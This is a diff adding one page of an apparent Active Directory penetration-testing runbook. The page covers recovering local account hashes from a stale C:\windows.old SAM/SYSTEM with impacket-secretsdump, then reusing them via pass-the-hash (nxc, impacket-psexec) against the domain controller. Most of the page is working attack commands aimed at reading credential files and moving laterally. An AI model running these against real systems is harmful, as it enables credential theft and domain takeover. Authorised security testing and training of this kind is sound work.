@@ -1,0 +1,53 @@
+# AD - Stale Hive Credential Reuse (windows.old)
+
+**Step 43B of 50 · AD**
+
+*Read a readable C:\windows.old (or backup) SAM/SYSTEM to recover a local account hash, then reuse it if it matches a domain account.*
+
+## When to use this page
+
+Use this page when a low-privileged user (or a foothold account) can read files from `C:\windows.old\Windows\System32\config\` — typically `SAM` and `SYSTEM`. This occurs when an old Windows installation was left behind, or when a recovery image/backup directory is exposed.
+
+## Find and inspect
+
+> **Why:** A stale image often contains a local administrator account whose hash was never rotated. If that password is reused by a domain user, pass-the-hash becomes a direct path to DA.
+```cmd
+dir C:\windows.old\Windows\System32\config
+type C:\windows.old\Windows\System32\config\SAM | findstr /i "tom_admin" 2>nul
+type C:\windows.old\Windows\System32\config\SYSTEM | findstr /i "tom_admin" 2>nul
+```
+
+## Extract and parse the hives (Windows)
+
+Save the hives and parse with Impacket. Run this from Kali if the local shell supports uploading; if you're on Windows, copy locally or parse as appropriate.
+
+> **Why:** A Volume Shadow Copy is not required. Simply reading the raw hives and using `secretsdump.py LOCAL` decrypts the local account hashes from SAM/SYSTEM.
+```bash
+# If saved remotely or already on disk, copy and parse.
+# From Windows (via a working shell), copy to loot first:
+# copy C:\windows.old\Windows\System32\config\SAM C:\Windows\Temp\old-sam.hiv
+# copy C:\windows.old\Windows\System32\config\SYSTEM C:\Windows\Temp\old-system.hiv
+
+# Parse offline in Kali:
+impacket-secretsdump -sam loot/old-sam.hiv -system loot/old-system.hiv LOCAL
+```
+
+## Reuse the recovered hash
+
+Look for the relevant RID (often RID 500 for Administrator, or a named local admin). If the same NT hash belongs to a domain user (password reuse), pass-the-hash to domain targets.
+
+> **Why:** Confirm the account's scope and status before proceeding. Start with SMB to confirm Pwn3d!.
+```bash
+# Try the recovered NT hash against domain/hosts
+nxc smb $DCip -u tom_admin -H $NThash
+nxc smb $BoxIP -u tom_admin -H $NThash
+nxc winrm $DCip -u tom_admin -H $NThash  # if WinRM open
+impacket-psexec $Domain/tom_admin@$DCip -hashes :$NThash
+```
+
+## Notes & safety
+
+- Do not attempt to overwrite the stale hives. Only read/copy.
+- Password reuse is a common issue — the NT hash from a stale local SAM can be the key to a domain account.
+- Log the recovered RID, username, and hash path in the engagement (do **not** paste the full hash into this runbook).
+- If the hash is only for a local account on the same host, it can still be useful for local admin access (subject to UAC/token filtering).
